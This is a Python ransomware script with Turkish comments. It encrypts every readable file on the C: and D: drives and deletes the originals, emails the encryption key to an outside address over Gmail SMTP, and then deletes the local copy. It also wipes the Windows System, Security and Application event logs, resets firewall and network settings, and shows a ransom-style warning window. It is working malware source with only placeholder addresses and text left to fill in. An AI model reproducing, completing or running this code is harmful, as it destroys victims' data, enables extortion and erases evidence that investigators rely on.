import os
import shutil
import getpass
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

def generate_encryption_key():
    # Şifreleme anahtarı oluştur
    key = Fernet.generate_key()

    # Anahtarı bir dosyada sakla
    with open('encryption_key.txt', 'wb') as key_file:
        key_file.write(key)

    return key

def encrypt_files(key, target_disks):
    # Disklerdeki dosyaları şifrele
    for disk in target_disks:
        for root, directories, files in os.walk(disk):
            for file in files:
                file_path = os.path.join(root, file)

                # Random.py dosyasını şifreleme
                if file_path.endswith('Random.py'):
                    continue

                # Dosyanın yetki iznini kontrol et
                if not os.access(file_path, os.R_OK):
                    continue

                # Dosyayı şifrele
                with open(file_path, 'rb') as original_file:
                    original_data = original_file.read()
                    cipher_suite = Fernet(key)
                    encrypted_data = cipher_suite.encrypt(original_data)

                # Şifrelenmiş veriyi kaydet
                with open(file_path + '.encrypted', 'wb') as encrypted_file:
                    encrypted_file.write(encrypted_data)

                # Orijinal dosyayı sil
                os.remove(file_path)

def send_encryption_key(sender_email, password, receiver_email):
    # Şifreleme anahtarını e-posta ile gönder
    message = MIMEMultipart()
    message['Subject'] = 'Encryption Key'
    message['From'] = sender_email
    message['To'] = receiver_email

    body = 'Please find the encryption key attached.'
    message.attach(MIMEText(body, 'plain'))

    attachment = MIMEText(open('encryption_key.txt', 'rb').read())
    attachment.add_header('Content-Disposition', 'attachment', filename='encryption_key.txt')
    message.attach(attachment)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(sender_email, password)
        smtp.sendmail(sender_email, receiver_email, message.as_string())

    # Şifreleme anahtarını sil
    os.remove('encryption_key.txt')

def change_desktop_background(logo_path):
    # Masaüstü arkaplanını değiştir
    desktop_path = os.path.join(os.path.expanduser("~"), 'Desktop')
    shutil.copyfile(logo_path, os.path.join(desktop_path, 'logo.png'))

def clear_event_logs():
    # Olay günlüğünü sil
    os.system('wevtutil cl System')
    os.system('wevtutil cl Security')
    os.system('wevtutil cl Application')

def clear_ram_logs():
    # RAM günlüğünü sil
    os.system('Clear-EventLog -LogName "System"')
    os.system('Clear-EventLog -LogName "Security"')
    os.system('Clear-EventLog -LogName "Application"')

def clear_network_logs():
    # Ağ günlüğünü sil
    os.system('netsh firewall reset')
    os.system('netsh int ip reset')
    os.system('netsh advfirewall reset')

def show_warning_message():
    def ok_button_click():
        window.destroy()

    window = tk.Tk()
    window.title("Uyarı")
    window.geometry("800x800")
    window.configure(bg="gray")

    label = tk.Label(window, text="buraya yaz", font=("Arial", 12, "bold"), bg="gray", fg="black")
    label.pack(pady=200)

    button = tk.Button(window, text="OK", font=("Arial", 12, "bold"), bg="gray", fg="black", command=ok_button_click)
    button.pack(pady=20)

    window.mainloop()

def main():
    # Şifreleme anahtarını oluştur
    key = generate_encryption_key()

    # Disklerin listesini al
    target_disks = ['C:\\', 'D:\\']

    # Dosyaları şifrele
    encrypt_files(key, target_disks)

    # E-posta ile şifreleme anahtarını gönder
    sender_email = 'your_email@example.com'
    password = getpass.getpass(prompt='Enter your email password: ')
    receiver_email = 'recipient_email@example.com'
    send_encryption_key(sender_email, password, receiver_email)

    # Masaüstü arkaplanını değiştir
    logo_path = 'path_to_your_logo_image'
    change_desktop_background(logo_path)

    # Olay, RAM ve ağ günlüklerini sil
    clear_event_logs()
    clear_ram_logs()
    clear_network_logs()

    # Uyarı mesajını göster
    show_warning_message()

    print("İşlem tamamlandı.")

if __name__ == '__main__':
    main()
